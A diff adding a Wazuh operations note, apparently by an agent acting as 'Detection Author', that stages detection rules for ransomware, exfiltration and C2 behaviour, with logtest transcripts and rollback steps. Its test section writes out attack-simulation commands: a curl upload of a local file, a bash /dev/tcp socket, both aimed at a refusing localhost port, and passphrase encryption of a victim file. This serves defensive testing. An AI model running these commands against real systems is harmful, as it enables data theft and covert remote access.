@@ -1,0 +1,459 @@
+# Wazuh manager changes — IA1803, 2026-09-08
+
+Written by the Detection Author under **DEC-056** (route B: local rules author the three
+unreachable categories) and **P2-T11** design note 9 (the heartbeat rule `100999`).
+
+Everything below was run on this host as `user1` under `sg wazuh`. Nothing here has been
+committed and **the manager has not been restarted** — the two commands that need root are
+in §4 and they are the Owner's.
+
+---
+
+## 1 · State right now
+
+| thing | state |
+|---|---|
+| `conf/local_rules.xml` | written, well-formed, in the repo, **uncommitted** |
+| `/var/ossec/etc/rules/local_rules.xml` | **staged** — byte-identical to the repo copy (`md5 afd2ef60d7d3418cbdc27c493ad9eccf`) |
+| `/var/ossec/etc/ossec.conf` | **unchanged.** The stanza in §3 has not been applied |
+| `conf/ossec.conf.bak-2026-09-08` | backup of the live file taken before anything else, git-ignored |
+| running manager | still on the ruleset it started with; the four rules are **not live** |
+
+The staged file goes live at the **next restart of `wazuh-manager` for any reason**, not only
+the Owner's planned one. That is intended, and it is safe in the sense that matters: the file
+parses, proved in §5 by loading it into `wazuh-logtest`, and a ruleset that logtest loads is a
+ruleset that will not stop the manager from starting.
+
+Manager version, read from `/var/ossec/VERSION.json`: **4.14.7 rc1** (commit `8c41e20`).
+
+---
+
+## 2 · The rules file
+
+Deployed path `/var/ossec/etc/rules/local_rules.xml`, reached by `<rule_dir>etc/rules</rule_dir>`
+at `ossec.conf:282`. The directory was **empty since 2026-08-17 00:41** — the local rules that
+produced `100101`/`100112`/`100200`/`100204`/`100205` in the archive are gone.
+
+| id | level | band (DEC-054) | MITRE | category via `resolve()` | signal |
+|---|---|---|---|---|---|
+| `100999` | 3 | low | — | `unknown` (correct: a heartbeat is not an attack) | `ossec: output: 'soc_heartbeat':` under stock rule 530 |
+| `100301` | 12 | critical | T1486 | `ransomware` | auditd execve, non-interactive symmetric encryption |
+| `100302` | 10 | high | T1041 | `data_exfiltration` | auditd execve, local file uploaded by curl/wget |
+| `100303` | 12 | critical | T1071 | `c2_beacon` | auditd execve, shell attached to a socket |
+
+**Why `1003xx` and not the old block.** `100101`, `100112`, `100200`, `100204` and `100205` all
+appear in the 30-day archive (`/home/user1/archive/alerts-2026-08-08_09-07.jsonl`, measured
+08/09: 8 / 1935 / 4 / 5 / 467 alerts respectively). Reusing one of those ids would make the
+archive's own history ambiguous, and `100112` is the subject of DEC-055.
+
+**Why these signals and not others.** Measured on the archive on 08/09: auditd is live on this
+host and the running audit ruleset carries an **execve watch keyed `exec`** (2,337 alerts),
+plus `privesc` (467), `modules` (5) and `identity` (4). That watch is realtime, so a lab
+scenario closes the loop in seconds. The alternative for `ransomware` — FIM rules 550/554 on a
+ransom note — is a better detection but `syscheck` on this manager runs on a 12-hour schedule
+(`ossec.conf:137`, no `realtime` attribute), so it cannot close a lab window. The trade is
+recorded in the rule's own comment.
+
+Each rule carries its real-world premise **and the gap in that premise** in an XML comment
+above it. DEC-056 amendment 3 applies to `100301`-`100303`: the behaviour the lab generates is
+real, but the detection logic that classifies it was written by the operator whose system is
+being evaluated. `docs/limitations.md` is where that is stated; these comments are so a reader
+of the rule can judge it without leaving the file.
+
+---
+
+## 3 · The `ossec.conf` change — the heartbeat producer
+
+Only one stanza is added. Nothing existing is edited or removed.
+
+**Insert point, against the real file as it is today:** after the `syscollector` wodle, which
+ends at **line 103**, and before `<sca>` at **line 105** — i.e. on the blank line 104. That puts
+it with the other three wodles (`cis-cat` line 64, `osquery` line 75, `syscollector` line 84).
+
+### Option A — the `command` wodle (chot-v3-14-ngay.md D2's letter). **Partly `unverified`.**
+
+```xml
+  <!-- AI_Support_SOC ingest heartbeat. Rule 100999 in etc/rules/local_rules.xml
+       matches this output. D2 / DEC-056 / P2-T11. -->
+  <wodle name="command">
+    <disabled>no</disabled>
+    <tag>soc_heartbeat</tag>
+    <command>/usr/bin/date -u +soc_heartbeat_%Y-%m-%dT%H:%M:%SZ</command>
+    <interval>10m</interval>
+  </wodle>
+```
+
+**`unverified`, and why (DEC-025).** Two things about this block cannot be checked from this
+account:
+
+1. **The element names.** `wazuh-modulesd` is `root:root` mode 750 and there is no shipped
+   example of a `command` wodle anywhere under `/var/ossec` (searched `etc/`, `ruleset/`,
+   `framework/`, `api/`). An unknown element inside a known wodle makes the manager refuse to
+   start. The stanza is deliberately cut to the four elements needed — `run_on_start`,
+   `ignore_output`, `timeout` and `verify_md5` are all omitted, so there are four names to be
+   wrong about instead of eight.
+2. **The output envelope.** Rule `100999` matches `ossec: output: 'soc_heartbeat':`. That
+   envelope is **verified** for `<localfile>` command output (§5, transcript 1) but only
+   *assumed* for the `command` wodle. If the wodle uses a different envelope the wodle will run
+   and the rule will not fire — a silent zero, not a crash.
+
+`date` is used rather than `echo` so that every beat is a distinct string; an identical
+repeated line is the shape that any future de-duplication would swallow. The format string
+contains no spaces, so it survives argv splitting whether or not the wodle uses a shell.
+
+### Option B — the `localfile` full_command form. **Verified today.**
+
+```xml
+  <!-- AI_Support_SOC ingest heartbeat. Rule 100999 in etc/rules/local_rules.xml
+       matches this output. D2 / DEC-056 / P2-T11. -->
+  <localfile>
+    <log_format>full_command</log_format>
+    <command>/usr/bin/date -u +soc_heartbeat_%Y-%m-%dT%H:%M:%SZ</command>
+    <alias>soc_heartbeat</alias>
+    <frequency>600</frequency>
+  </localfile>
+```
+
+Insert instead after the existing `last -n 20` localfile, which ends at **line 262**.
+
+Both element names and output envelope are verified: three stanzas of exactly this shape are
+running in this file today (lines 245, 251, 258), and §5 transcript 1 shows the envelope they
+produce being matched by rule `100999`. `<alias>` sets the tag, exactly as
+`<alias>netstat listening ports</alias>` does at line 254.
+
+**Which to use is the Owner's call and it touches a chốt.** D2 says "wodle `command`". The
+acceptance that actually binds is P2-T11's — `rule.id:100999` reaching the indexer within 30
+minutes — and both options satisfy it identically. Option A is the letter of D2 with an
+unverified failure mode that stops the manager; option B is a verified mechanism that deviates
+from D2's wording. A decision block is in the Detection Author's report.
+
+---
+
+## 4 · The two commands that need root
+
+Run in this order. Both are the Owner's; neither is run by the Detection Author.
+
+### 4.1 · Deploy the rules and restart the manager
+
+```bash
+# 1. take the rules file to the standard ownership (it is staged as user1:wazuh 660)
+sudo chown wazuh:wazuh /var/ossec/etc/rules/local_rules.xml
+sudo chmod 660 /var/ossec/etc/rules/local_rules.xml
+
+# 2. apply the chosen stanza from §3 to /var/ossec/etc/ossec.conf (editor, by hand)
+
+# 3. restart
+sudo systemctl restart wazuh-manager
+```
+
+**Expected to print:** nothing. `systemctl restart` is silent on success.
+
+**Confirm it actually came up — do not skip this:**
+
+```bash
+systemctl is-active wazuh-manager
+sudo tail -n 40 /var/ossec/logs/ossec.log
+```
+
+`is-active` must print **`active`**.
+
+For the log, check for the *absence* of errors rather than for a particular success line: the
+exact startup wording is `unverified` — this manager has not restarted since its log last
+rotated (rotation is daily at 00:00 and `ossec.log` keeps no archive of previous days), so no
+real startup transcript could be read back to quote. What can be stated is the error side, and
+one of the two was observed directly in §5.6:
+
+```bash
+sudo grep -nE 'ERROR|CRITICAL' /var/ossec/logs/ossec.log | tail -20
+```
+
+`Error reading XML file` means the ruleset did not parse; `Invalid element in the configuration`
+means the §3 stanza has a bad element name. Either way the manager is down and not alerting —
+go to §6 and roll back. A clean start leaves no `ERROR` line at all: `ossec.log` as it stands on
+08/09 contains none.
+
+`ossec.log` is `wazuh:wazuh` mode 660 and `user1` is in group `wazuh`, so this grep also works
+without `sudo`.
+
+### 4.2 · Install ClamAV (for the `malware` category in `docs/lab-scenarios.md`)
+
+```bash
+sudo apt install -y clamav clamav-daemon
+```
+
+**Expected to print:** the usual apt transcript ending in `Setting up clamav-daemon`, then
+`freshclam` starting a first signature download. Verify with:
+
+```bash
+command -v clamscan && systemctl is-active clamav-daemon
+```
+
+→ `/usr/bin/clamscan` and `active`. Measured 08/09 before this command: `clamscan`, `suricata`,
+`nmap` and `freshclam` are all **absent**.
+
+This is needed only for the `malware` scenario. It does not affect the four rules above and can
+be done before or after the restart. The stock path it unlocks is decoder
+`0075-clamav_decoders.xml` and rule **52502** *"ClamAV: Virus detected"*, level 8 — both confirmed
+present in the shipped ruleset on 08/09.
+
+---
+
+## 5 · logtest transcripts
+
+Fed from a file, never a pipe:
+
+```bash
+printf '<one log line>\n' > /tmp/lt.txt
+sg wazuh -c '/var/ossec/bin/wazuh-logtest < /tmp/lt.txt'
+```
+
+**The banner reads `Starting wazuh-logtest ERROR`. That is not a load failure.** The literal
+`ERROR` is the version string: `wazuh-logtest -V` prints `Wazuh ERROR - Wazuh Inc.` on this
+install, so the framework's version lookup is what is broken, not the ruleset. It printed the
+same way before `local_rules.xml` existed. Recorded because it looks exactly like the thing it
+is not.
+
+**The three audit events below are real.** They were produced by running the commands on this
+host at **2026-09-08 08:41:48–08:42:38 UTC (15:41:48–15:42:38 +07:00)** and then read back out
+of `/var/log/audit/audit.log` (readable without root: it is `root:adm` and `user1` is in `adm`)
+and joined the way `wazuh-logcollector`'s `log_format audit` joins them. Nothing was invented.
+Nothing left the host — the two network commands target `127.0.0.1:9`, which refuses.
+
+**Control that the capture method is honest:** the same capture, applied to a plain `ps aux`,
+reproduces stock rule **92604** *"Processes running for all users were queried with ps command"*
+— a rule written by Wazuh, not here.
+
+### 1 · `100999` heartbeat
+
+```
+$ printf "ossec: output: 'soc_heartbeat': soc_heartbeat_2026-09-08T08:45:00Z\n" > /tmp/lt.txt
+$ sg wazuh -c '/var/ossec/bin/wazuh-logtest < /tmp/lt.txt'
+
+**Phase 1: Completed pre-decoding.
+	full event: 'ossec: output: 'soc_heartbeat': soc_heartbeat_2026-09-08T08:45:00Z'
+
+**Phase 2: Completed decoding.
+	name: 'ossec'
+
+**Phase 3: Completed filtering (rules).
+	id: '100999'
+	level: '3'
+	description: 'SOC pipeline heartbeat.'
+	groups: '['local', 'soc_heartbeat']'
+	firedtimes: '1'
+	mail: 'False'
+**Alert to be generated.
+```
+
+### 2 · `100301` ransomware
+
+Command run: `openssl enc -aes-256-cbc -pbkdf2 -k S0meP4ss -in victim.dat -out victim.dat.enc`
+
+```
+argv: type=EXECVE ... argc=10 a0="/usr/bin/openssl" a1="enc" a2="-aes-256-cbc" a3="-pbkdf2"
+      a4="-k" a5="S0meP4ss" a6="-in" a7="victim.dat" a8="-out" a9="victim.dat.enc"
+
+**Phase 3: Completed filtering (rules).
+	id: '100301'
+	level: '12'
+	description: 'Possible ransomware: non-interactive symmetric encryption via /usr/bin/openssl.'
+	groups: '['local', 'ransomware']'
+	firedtimes: '1'
+	mail: 'True'
+	mitre.id: '['T1486']'
+	mitre.tactic: '['Impact']'
+	mitre.technique: '['Data Encrypted for Impact']'
+**Alert to be generated.
+```
+
+### 3 · `100302` data exfiltration
+
+Command run: `curl --max-time 2 -T victim.dat http://127.0.0.1:9/`
+
+```
+argv: type=EXECVE ... argc=6 a0="/usr/bin/curl" a1="--max-time" a2="2" a3="-T"
+      a4="victim.dat" a5="http://127.0.0.1:9/"
+
+**Phase 3: Completed filtering (rules).
+	id: '100302'
+	level: '10'
+	description: 'Possible data exfiltration: local file uploaded via /usr/bin/curl.'
+	groups: '['local', 'exfiltration']'
+	firedtimes: '1'
+	mail: 'False'
+	mitre.id: '['T1041']'
+	mitre.tactic: '['Exfiltration']'
+	mitre.technique: '['Exfiltration Over C2 Channel']'
+**Alert to be generated.
+```
+
+### 4 · `100303` C2 channel
+
+Command run: `bash -c 'exec 3<>/dev/tcp/127.0.0.1/9'`
+
+```
+argv: type=EXECVE ... argc=3 a0="/usr/bin/bash" a1="-c"
+      a2=6578656320333C3E2F6465762F7463702F3132372E302E302E312F39
+
+**Phase 3: Completed filtering (rules).
+	id: '100303'
+	level: '12'
+	description: 'Possible C2 channel: shell attached to a network socket.'
+	groups: '['local', 'c2_beacon']'
+	firedtimes: '1'
+	mail: 'True'
+	mitre.id: '['T1071']'
+	mitre.tactic: '['Command and Control']'
+	mitre.technique: '['Application Layer Protocol']'
+**Alert to be generated.
+```
+
+That hex is `exec 3<>/dev/tcp/127.0.0.1/9`. **auditd hex-encodes any execve argument containing
+a space or a shell metacharacter**, so the plain-text form of this rule — the form written
+first — could never have fired on the case the rule exists for. It was found by running the
+command, not by reading the rule. The hex branch (`2F6465762F7463702F` = `/dev/tcp/`) is what
+does the work.
+
+### 5 · The failing cases — three lines that must not match, and do not
+
+Each is the *same tool* as the positive above it, without the behaviour the rule claims to
+detect. All three fall through to stock rule `80700` *"Audit: Messages grouped"*, level 0 —
+**no alert generated**.
+
+| command run | why it must not match | result |
+|---|---|---|
+| `openssl enc -aes-256-cbc -pbkdf2 -in victim.dat -out /dev/null` | no passphrase on the command line; openssl prompted `enter AES-256-CBC encryption password`, which is the interactive-admin case | `80700`, level 0 |
+| `curl --max-time 2 -s -o /dev/null http://127.0.0.1:9/` | a download, the opposite direction from exfiltration | `80700`, level 0 |
+| `nc -z -w1 127.0.0.1 9` | a port check with no exec option; no shell is attached | `80700`, level 0 |
+
+### 6 · The load check is not vacuous
+
+Both failure modes were induced on a staged copy and the good file restored afterwards.
+
+```
+=== duplicate rule id 100301 ===
+** Wazuh-Logtest: WARNING: (7612): Rule ID '100301' is duplicated. Only the first occurrence will be considered.
+
+=== malformed XML (closing tag typo) ===
+** Wazuh-logtest error -1:
+	ERROR: (1226): Error reading XML file 'etc/rules/local_rules.xml': XMLERR: Element 'group' not closed. (line 51).
+	ERROR: (7311): Failure to initializing session
+```
+
+Note the asymmetry, because it decides how much the restart can be trusted: **malformed XML is a
+hard error** and is the thing that would keep the manager down, and logtest catches it before the
+restart. **A duplicate id is only a WARNING** — the manager starts and silently uses the first
+occurrence. logtest will not stop that one for you.
+
+---
+
+## 6 · Rollback
+
+### Rules only
+
+```bash
+sudo rm /var/ossec/etc/rules/local_rules.xml
+sudo systemctl restart wazuh-manager
+```
+
+Returns `/var/ossec/etc/rules` to the empty state it was in from 2026-08-17 00:41 to
+2026-09-08.
+
+### `ossec.conf`
+
+```bash
+sudo cp /project/project/AI_Support_SOC_1_2/conf/ossec.conf.bak-2026-09-08 /var/ossec/etc/ossec.conf
+sudo chown root:wazuh /var/ossec/etc/ossec.conf
+sudo chmod 660 /var/ossec/etc/ossec.conf
+sudo systemctl restart wazuh-manager
+```
+
+The backup is the live file as of 2026-09-08 15:40 +07:00, 9842 bytes, taken before any change.
+It is git-ignored (`.gitignore`, `conf/ossec.conf.bak-*`) and **must stay that way**: it contains
+the live `<integration>` `api_key` at `ossec.conf:342`.
+
+**If the manager will not start after the restart, do the `ossec.conf` rollback first** — the
+rules file is proven to parse, so the config stanza is the only new thing that can hold it down.
+
+---
+
+## 7 · Verification after the restart (P2-T11 acceptance)
+
+Read-only, as `soc_ro`, from the primary checkout:
+
+```bash
+set -a; . ./.env; set +a
+for id in 100999 100301 100302 100303; do
+  printf 'rule.id:%s ' "$id"
+  curl -s --cacert "$INDEXER_CA" -u "$INDEXER_USER:$INDEXER_PASSWORD" \
+    "$INDEXER_URL/wazuh-alerts-*/_count?q=rule.id:$id"; echo
+done
+```
+
+**Baseline measured 2026-09-08 08:46:47 UTC, before the restart:**
+
+```
+rule.id:100999  {"count":0,...}
+rule.id:100301  {"count":0,...}
+rule.id:100302  {"count":0,...}
+rule.id:100303  {"count":0,...}
+control (no filter)  {"count":14930,...}
+```
+
+The control is there so the zeros mean something: the query shape reaches 14,930 documents, so
+the four zeros are real absences and not a broken query. Same construction as the 06/09
+measurement in P2-T11 design note 9.
+
+**Expected after the restart:**
+
+| id | expectation | within |
+|---|---|---|
+| `100999` | **≥ 1** | `HEARTBEAT_MAX_AGE_MIN` = 30 minutes. End-to-end latency includes a Logstash flush (DEC-001), so allow a few minutes before calling it a failure |
+| `100301` | `0` | until the lab scenario runs |
+| `100302` | `0` | until the lab scenario runs |
+| `100303` | `0` | until the lab scenario runs |
+
+**Once `100999` is ≥ 1**, P2-T11 design note 9's second half applies: record one document into
+`backend/tests/fixtures/indexer_heartbeat_hit.json`, drop the word `synthetic` from the test
+docstring, and acceptance 5's `grep -c 'synthetic'` goes from `≥ 1` to `0`. **P2-T11 is blocked
+on this and has been since 06/09.**
+
+**If `100999` stays at 0 for more than 30 minutes with the manager `active`**, the wodle ran but
+the envelope did not match — that is the §3 Option A `unverified` risk landing. The fix is
+option B, and it costs one more restart, not a redesign.
+
+---
+
+## 8 · Things found on the way that are not this document's job
+
+Recorded here so they are not lost; none is acted on.
+
+1. **`ossec.conf:339-345` posts to a dead endpoint.** The `<integration>` block sends alerts at
+   `<level>11</level>` and above to `http://127.0.0.1:8001/wazuh-webhook`. Measured 08/09:
+   **nothing is listening on 8001** (`ss -ltn`). Rules `100301` and `100303` are level 12, so
+   from the restart onward every one of their alerts will make `wazuh-integratord` attempt and
+   fail a POST. Harmless to alerting — the indexer path is separate — but it will write errors
+   to `ossec.log`. The path also does not match P2-T12's `POST /webhook/alerts` (DEC-040).
+2. **`ossec.conf:272` excludes `0215-policy_rules.xml`.** This is a concrete reason
+   `policy_violation` has no signal in any stock rule, which is inventory **A5**'s question.
+   Whether re-including it is a route for A5 is the Owner's call, not the Detection Author's.
+3. **The `recon` category is unaffected by DEC-055.** Checked because rule `40601` lives in
+   `0280-attack_rules.xml`: its file group is `attacks` (plural), not `attack`, and `40601`
+   carries MITRE `T1046` which reaches `recon` at tier 1 anyway. `5731` also carries `T1046`;
+   `5706` carries `T1021.004`, which is in no tier of the resolver, and reaches `recon` at tier
+   3 through its own `recon` group. So all three `recon` rules classify.
+4. **`alerts.json` is readable by `user1` today — `00-context-pack.md` §6.3 says it is not.**
+   Measured 08/09 with no `sudo` and no `sg`: `head -c 120 /var/ossec/logs/alerts/alerts.json`
+   returns alert JSON. `/var/ossec/logs/alerts` is `drwxr-x--- wazuh:wazuh` and `alerts.json` is
+   `-rw-r----- wazuh:wazuh`, and `user1` carries gid 124 (`wazuh`) as a supplementary group, which
+   the kernel applies without `sg`. The context pack states the opposite — "`alerts.json` is
+   **not** readable without root, so the D3/F2 file fallback is unavailable **to the
+   application**" — and DEC-001 rests on it. The statement was probably true when written on
+   05/09 and stopped being true when `user1` joined the group. This is not the Detection Author's
+   to change; it is raised as a decision block in the report because it reopens whether the
+   puller is the only path to history for the app.
+
+5. **The audit events this document's §5 rests on are in production data.** They were generated
+   at 2026-09-08 08:41:48–08:42:38 UTC on the same host G1 draws from. They produced no alert
+   under the ruleset running at the time (the rules were not live), but the raw audit records
+   exist. If G1's window covers 08/09, exclude that 50-second span.
